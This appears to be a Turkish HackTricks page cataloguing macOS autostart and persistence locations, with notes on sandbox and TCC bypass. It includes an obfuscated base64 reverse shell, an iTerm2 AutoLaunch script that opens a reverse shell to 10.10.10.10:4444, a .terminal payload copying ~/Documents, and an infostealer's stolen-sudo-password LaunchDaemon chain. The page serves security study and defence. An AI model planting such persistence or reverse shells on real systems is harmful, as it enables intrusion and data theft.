# macOS Otomatik Başlatma

{{#include ../banners/hacktricks-training.md}}

Bu bölüm büyük ölçüde [**Beyond the good ol’ LaunchAgents**](https://theevilbit.github.io/beyond/) blog serisine dayanmaktadır. Amaç, **daha fazla Autostart Locations** eklemek (mümkünse), macOS’un en son sürümünde (13.4) **hangi tekniklerin hâlâ çalıştığını** belirtmek ve gerekli **izinleri** açıklamaktır.

## Sandbox Bypass

> [!TIP]
> Burada **sandbox bypass** için kullanışlı olan; bir şeyi **bir dosyaya yazarak** ve çok **yaygın** bir **eylemi**, belirli bir **süreyi** veya root izinlerine ihtiyaç duymadan sandbox içinden genellikle gerçekleştirebileceğiniz bir **eylemi** bekleyerek çalıştırmanızı sağlayan başlangıç konumlarını bulabilirsiniz.

### Launchd

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **`/Library/LaunchAgents`**
- **Tetikleyici**: Reboot
- Root gerekli
- **`/Library/LaunchDaemons`**
- **Tetikleyici**: Reboot
- Root gerekli
- **`/System/Library/LaunchAgents`**
- **Tetikleyici**: Reboot
- Root gerekli
- **`/System/Library/LaunchDaemons`**
- **Tetikleyici**: Reboot
- Root gerekli
- **`~/Library/LaunchAgents`**
- **Tetikleyici**: Relog-in
- **`~/Library/LaunchDemons`**
- **Tetikleyici**: Relog-in

> [!TIP]
> İlginç bir bilgi olarak, **`launchd`**, Mach-o içerisindeki `__Text.__config` bölümünde, launchd’nin başlatması gereken diğer iyi bilinen servisleri içeren gömülü bir property list bulundurur. Ayrıca bu servisler, çalıştırılmaları ve başarıyla tamamlanmaları gerektiği anlamına gelen `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` değerlerini içerebilir.
>
> Elbette code signing nedeniyle değiştirilemez.

#### Açıklama ve Exploitation

**`launchd`**, başlangıçta OX S kernel tarafından çalıştırılan **ilk** **process** ve kapanışta tamamlanan son process’tir. Her zaman **PID 1** olmalıdır. Bu process, aşağıdaki konumlardaki **ASEP** **plist** dosyalarında belirtilen yapılandırmaları **okur ve çalıştırır**:

- `/Library/LaunchAgents`: Admin tarafından yüklenen kullanıcı başına agents
- `/Library/LaunchDaemons`: Admin tarafından yüklenen sistem genelindeki daemons
- `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına agents.
- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelindeki daemons.

Bir kullanıcı giriş yaptığında, `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` konumlarındaki plist dosyaları **oturum açan kullanıcının izinleriyle** başlatılır.

Agents ve daemons arasındaki **temel fark, agents’ın kullanıcı giriş yaptığında, daemons’ın ise sistem başlangıcında yüklenmesidir** (örneğin ssh gibi, herhangi bir kullanıcı sisteme erişmeden önce çalıştırılması gereken servisler vardır). Ayrıca agents GUI kullanabilirken daemons arka planda çalışmalıdır.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Bir **agent'ın kullanıcı giriş yapmadan önce çalıştırılması gereken** durumlar vardır; bunlara **PreLoginAgents** denir. Örneğin bu, giriş sırasında yardımcı teknolojiler sağlamak için kullanışlıdır. Bunlar ayrıca `/Library/LaunchAgents` içinde bulunabilir ([**burada**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bir örnek görebilirsiniz).

> [!TIP]
> Yeni Daemons veya Agents yapılandırma dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` **kullanılarak yüklenecektir**. **`.plist` dosyalarını bu uzantı olmadan da** `launchctl -F <file>` **ile yüklemek mümkündür** (ancak bu plist dosyaları yeniden başlatmanın ardından otomatik olarak yüklenmez).\
> `launchctl unload <target.plist>` **ile kaldırmak** da mümkündür (bunun işaret ettiği process sonlandırılır),
>
> Bir **Agent** veya **Daemon**'ın **çalışmasını** **engelleyen** **herhangi bir şey** (örneğin bir override) **olmadığından emin olmak** için şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Mevcut kullanıcı tarafından yüklenen tüm agent ve daemon'ları listeleyin:
```bash
launchctl list
```
#### Örnek kötü amaçlı LaunchDaemon zinciri (password reuse)

Yakın zamanda ortaya çıkan bir macOS infostealer, bir **ele geçirilmiş sudo parolasını** yeniden kullanarak bir user agent ve root LaunchDaemon oluşturdu:<sup>[[1]](#references)</sup>

- Agent döngüsünü `~/.agent` konumuna yazın ve çalıştırılabilir hale getirin.
- Bu agent'a işaret eden bir plist'i `/tmp/starter` konumunda oluşturun.
- Çalınan parolayı `sudo -S` ile yeniden kullanarak dosyayı `/Library/LaunchDaemons/com.finder.helper.plist` konumuna kopyalayın, `root:wheel` olarak ayarlayın ve `launchctl load` ile yükleyin.
- Çıktıyı ayırmak için agent'ı `nohup ~/.agent >/dev/null 2>&1 &` ile sessizce başlatın.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Bir plist bir kullanıcıya aitse, daemon sistem genelindeki klasörlerde bulunsa bile **görev root olarak değil kullanıcı olarak yürütülür**. Bu, bazı privilege escalation saldırılarını önleyebilir.

#### launchd hakkında daha fazla bilgi

**`launchd`**, **kernel** tarafından başlatılan ilk **user mode** process'tir. Process'in başlatılması **başarılı olmalıdır** ve process **çıkamaz veya crash olamaz**. Hatta bazı **killing signal'larına** karşı **korumalıdır**.

`launchd`'nin yapacağı ilk şeylerden biri, aşağıdakiler gibi tüm **daemon'ları** **başlatmaktır**:

- Çalıştırılma zamanına göre **timer daemon'ları**:
- atd (`com.apple.atrun.plist`): 30 dakikalık bir `StartInterval` değerine sahiptir
- crond (`com.apple.systemstats.daily.plist`): 00:15'te başlatılmak üzere `StartCalendarInterval` değerine sahiptir
- **Network daemon'ları**:
- `org.cups.cups-lpd`: TCP'yi (`SockType: stream`) `printer` değerindeki `SockServiceName` ile dinler
- SockServiceName bir port veya `/etc/services` içindeki bir service olmalıdır
- `com.apple.xscertd.plist`: TCP üzerinde 1640 portunu dinler
- Belirtilen bir path değiştiğinde çalıştırılan **path daemon'ları**:
- `com.apple.postfix.master`: `/etc/postfix/aliases` path'ini kontrol eder
- **IOKit notifications daemon'ları**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` entry'sinde `com.apple.xscertd.helper` adını belirtir
- **UserEventAgent:**
- Bu, önceki örnekten farklıdır. Belirli bir event'e yanıt olarak launchd'nin app'leri spawn etmesini sağlar. Ancak bu durumda kullanılan ana binary `launchd` değil, `/usr/libexec/UserEventAgent`'tır. SIP restricted folder olan `/System/Library/UserEventPlugins/` içinden plugin'leri yükler; her plugin, initializer'ını `XPCEventModuleInitializer` key'inde veya eski plugin'lerde, `Info.plist` dosyasındaki `FB86416D-6164-2070-726F-70735C216EC0` key'i altındaki `CFPluginFactories` dict'inde belirtir.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Ancak bu dosyaları yükleyen bir shell'i çalıştıran TCC bypass'a sahip bir app bulmanız gerekir

#### Konumlar

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: zsh ile bir terminal açın
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: zsh ile bir terminal açın
- Root gerektirir
- **`~/.zlogout`**
- **Trigger**: zsh ile bir terminalden çıkın
- **`/etc/zlogout`**
- **Trigger**: zsh ile bir terminalden çıkın
- Root gerektirir
- Potansiyel olarak daha fazlası: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bash ile bir terminal açın
- `/etc/profile` (çalışmadı)
- `~/.profile` (çalışmadı)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xterm ile tetiklenmesi beklenir; ancak **kurulu değildir** ve kurulduktan sonra bile şu hata alınır: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Açıklama ve Exploitation

`zsh` veya `bash` gibi bir shell başlatılırken **belirli startup file'lar çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh` kullanır. Bu shell, Terminal application başlatıldığında veya bir cihaza SSH üzerinden erişildiğinde otomatik olarak açılır. `bash` ve `sh` macOS'ta mevcut olsa da kullanılmaları için açıkça çağrılmaları gerekir.<sup>[[2]](#references)</sup>

`man zsh` komutuyla okuyabileceğimiz zsh man page'i, startup file'lar hakkında uzun bir açıklama içerir.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Yeniden Açılan Uygulamalar

> [!CAUTION]
> Belirtilen exploitation yöntemini yapılandırmak ve oturumu kapatıp yeniden açmak, hatta yeniden başlatmak bile test sırasında uygulamanın çalıştırılmasını sağlamadı. Bu işlemler gerçekleştirilirken uygulamanın çalışıyor olması gerekebilir.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Tetikleyici**: Yeniden başlatma sonrasında uygulamaların yeniden açılması

#### Açıklama ve Exploitation

Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasının içindedir<sup>[[4]](#references)</sup>

Bu nedenle, yeniden açılacak uygulamaların kendi uygulamanızı başlatmasını sağlamak için **uygulamanızı listeye eklemeniz** yeterlidir.

UUID, bu dizin listelenerek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutuyla bulunabilir.

Yeniden açılacak uygulamaları kontrol etmek için şunu çalıştırabilirsiniz:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Bu listeye bir uygulama **eklemek** için şunu kullanabilirsiniz:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Tercihleri

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal, onu kullanan kullanıcının FDA izinlerine sahip olur

#### Konum

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Tetikleyici**: Terminal'i aç

#### Açıklama ve Exploitation

**`~/Library/Preferences`** içinde Applications'daki kullanıcının tercihleri depolanır. Bu tercihlerden bazıları, **diğer uygulamaları/script'leri execute etmek** için bir yapılandırma içerebilir.<sup>[[5]](#references)</sup>

Örneğin Terminal, Startup sırasında bir command execute edebilir:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Bu config, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasına şu şekilde yansır:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Dolayısıyla, sistemdeki terminal tercihlerinin plist dosyasının üzerine yazılabilirse, **`open`** işlevi **terminali açmak ve bu komutu çalıştırmak** için kullanılabilir.

Bunu cli üzerinden şu şekilde ekleyebilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Script'leri / Diğer dosya uzantıları

- Sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Kullanıcının FDA izinlerine sahip olmak için Terminal'i kullanma

#### Location

- **Anywhere**
- **Trigger**: Terminal'i aç

#### Description & Exploitation

Bir [**`.terminal`** script'i](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturup açarsanız, **Terminal uygulaması** içindeki belirtilen komutları çalıştırmak üzere otomatik olarak başlatılır. Terminal uygulamasının bazı özel ayrıcalıkları (TCC gibi) varsa komutunuz bu özel ayrıcalıklarla çalıştırılır.

Şununla deneyin:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Ayrıca normal shell script içeriğiyle **`.command`**, **`.tool`** uzantılarını da kullanabilirsiniz; bunlar da Terminal tarafından açılır.

> [!CAUTION]
> Terminal'de **Full Disk Access** varsa bu eylemi tamamlayabilir (yürütülen komutun bir Terminal penceresinde görünür olacağını unutmayın).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ek TCC erişimi elde edebilirsiniz

#### Konum

- **`/Library/Audio/Plug-Ins/HAL`**
- Root gerekir
- **Trigger**: coreaudiod'u veya bilgisayarı yeniden başlatın
- **`/Library/Audio/Plug-ins/Components`**
- Root gerekir
- **Trigger**: coreaudiod'u veya bilgisayarı yeniden başlatın
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: coreaudiod'u veya bilgisayarı yeniden başlatın
- **`/System/Library/Components`**
- Root gerekir
- **Trigger**: coreaudiod'u veya bilgisayarı yeniden başlatın

#### Açıklama

Önceki writeup'lara göre bazı **audio plugin'lerini derlemek** ve yüklenmelerini sağlamak mümkündür.<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ek TCC erişimi elde edebilirsiniz

#### Konum

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Açıklama ve Exploitation

QuickLook plugin'leri, **bir dosyanın önizlemesini tetiklediğinizde** (Finder'da dosya seçiliyken boşluk çubuğuna bastığınızda) ve **bu dosya türünü destekleyen bir plugin** yüklü olduğunda yürütülebilir.<sup>[[8]](#references)</sup>

Kendi QuickLook plugin'inizi derlemek, yüklenmesi için önceki konumlardan birine yerleştirmek ve ardından desteklenen bir dosyaya gidip tetiklemek için boşluk çubuğuna basmak mümkündür.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Bu bende çalışmadı; ne kullanıcı LoginHook'u ne de root LogoutHook'u çalıştı.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` benzeri bir şeyi yürütebilmeniz gerekir.
- `~/Library/Preferences/com.apple.loginwindow.plist` konumunda bulunur.

Kullanımdan kaldırılmıştır, ancak bir kullanıcı login olduğunda komut yürütmek için kullanılabilirler.<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Bu ayar `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` içinde saklanır.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Silmek için:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Root user için olanı **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** konumunda saklanır.

## Conditional Sandbox Bypass

> [!TIP]
> Burada **sandbox bypass** için, bir şeyi yalnızca **bir dosyaya yazarak** ve belirli **programların yüklü olması, "yaygın olmayan" kullanıcı** eylemleri veya ortamlar gibi **çok yaygın olmayan koşulların** gerçekleşmesini bekleyerek çalıştırmanıza olanak tanıyan başlangıç konumlarını bulabilirsiniz.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- **sandbox bypass** için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak `crontab` binary'sini çalıştırabiliyor olmanız gerekir
- Ya da root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Doğrudan yazma erişimi için root gerekir. `crontab <file>` çalıştırabiliyorsanız root gerekmez
- **Trigger**: Cron job'a bağlıdır

#### Açıklama ve Exploitation

**current user** kullanıcısının cron job'larını şu komutla listeleyin:
```bash
crontab -l
```
Kullanıcıların tüm cron jobs’larını **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** konumlarında da görebilirsiniz (root gerekir).

MacOS’ta **belirli sıklıkta** script çalıştıran çeşitli klasörler şurada bulunabilir:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Burada normal **cron** **jobs**, **at** **jobs** (çok sık kullanılmaz) ve **periodic** **jobs** (çoğunlukla geçici dosyaları temizlemek için kullanılır) bulabilirsiniz. Günlük periodic jobs, örneğin şu komutla çalıştırılabilir: `periodic daily`.<sup>[[10]](#references)</sup>

Programatik olarak bir **user cronjob** eklemek için şu kullanılabilir:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 daha önce TCC izinlerine sahipti

#### Konumlar

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Tetikleyici**: iTerm'i açma
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Tetikleyici**: iTerm'i açma
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Tetikleyici**: iTerm'i açma

#### Açıklama ve Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** içinde depolanan scriptler çalıştırılır. Örneğin:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
veya:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** script'i de çalıştırılır:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2 preferences konumunda bulunan **`~/Library/Preferences/com.googlecode.iterm2.plist`**, iTerm2 terminali açıldığında **çalıştırılacak bir komutu belirtebilir**.

Bu ayar iTerm2 settings bölümünde yapılandırılabilir:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Komut preferences içinde yansıtılır:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Yürütülecek komutu şu şekilde ayarlayabilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences**'ı abuse ederek arbitrary commands execute etmenin başka yollarının da olma ihtimali oldukça yüksek.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak xbar'ın kurulu olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility permissions ister

#### Konum

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: xbar execute edildiğinde

#### Açıklama

Popüler program [**xbar**](https://github.com/matryer/xbar) kuruluysa, xbar başlatıldığında execute edilecek bir shell script'i **`~/Library/Application\ Support/xbar/plugins/`** içine yazmak mümkündür:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Hammerspoon'un kurulu olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility izinleri ister

#### Konum

- **`~/.hammerspoon/init.lua`**
- **Tetikleyici**: hammerspoon çalıştırıldığında

#### Açıklama

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **LUA scripting language** kullanan bir **macOS** automation platformudur. Özellikle, eksiksiz AppleScript kodlarının entegre edilmesini ve shell script'lerinin çalıştırılmasını destekleyerek scripting yeteneklerini önemli ölçüde geliştirir.<sup>[[13]](#references)</sup>

Uygulama `~/.hammerspoon/init.lua` adlı tek bir dosyayı arar ve başlatıldığında script çalıştırılır.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak BetterTouchTool kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts ve Accessibility izinlerini ister

#### Konum

- `~/Library/Application Support/BetterTouchTool/*`

Bu araç, bazı kısayollara basıldığında çalıştırılacak uygulamaları veya script'leri belirtmeye olanak tanır. Bir saldırganın, **veritabanında kendi kısayolunu ve çalıştırılacak eylemi yapılandırarak** rastgele kod çalıştırması mümkün olabilir (bir kısayol yalnızca bir tuşa basmak olabilir).

### Alfred

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Alfred kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation, Accessibility ve hatta Full-Disk access izinlerini ister

#### Konum

- `???`

Belirli koşullar karşılandığında kod çalıştırabilen workflow'lar oluşturmaya olanak tanır. Bir saldırganın bir workflow dosyası oluşturup Alfred'in bunu yüklemesini sağlaması potansiyel olarak mümkündür (workflow'ları kullanmak için premium sürümün satın alınması gerekir).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak ssh etkinleştirilmiş ve kullanılıyor olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH, FDA access sahibi olmak için kullanılır

#### Konum

- **`~/.ssh/rc`**
- **Tetikleyici**: ssh üzerinden Login
- **`/etc/ssh/sshrc`**
- Root gerektirir
- **Tetikleyici**: ssh üzerinden Login

> [!CAUTION]
> ssh'i etkinleştirmek Full Disk Access gerektirir:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Açıklama ve Exploitation

Varsayılan olarak, `/etc/ssh/sshd_config` içinde `PermitUserRC no` bulunmadığı sürece, bir kullanıcı **SSH üzerinden Login yaptığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** script'leri çalıştırılır.<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak argümanlarla birlikte `osascript` çalıştırmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Tetikleyici:** Login
- `osascript` çağrılarak depolanan Exploit payload
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Tetikleyici:** Login
- Root gerektirir

#### Açıklama

System Preferences -> Users & Groups -> **Login Items** bölümünde, **kullanıcı Login yaptığında çalıştırılacak öğeleri** bulabilirsiniz.\
